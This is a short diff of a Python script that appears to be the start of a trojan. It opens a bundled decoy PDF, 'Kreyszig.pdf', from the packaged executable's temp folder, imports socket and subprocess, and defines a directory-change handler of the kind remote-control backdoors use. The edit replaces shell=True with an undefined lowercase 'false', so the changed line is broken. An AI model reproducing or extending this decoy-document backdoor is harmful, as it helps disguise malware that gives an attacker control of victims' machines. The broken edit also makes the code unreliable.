@@ -1,6 +1,6 @@
 import socket, subprocess, os, sys, tkinter
 file_name = sys._MEIPASS + "\Kreyszig.pdf"
-subprocess.Popen(file_name, shell=True)
+subprocess.Popen(file_name, shell=false)
 def cd1(path):
     os.chdir(path)
     msg = os.getcwd()
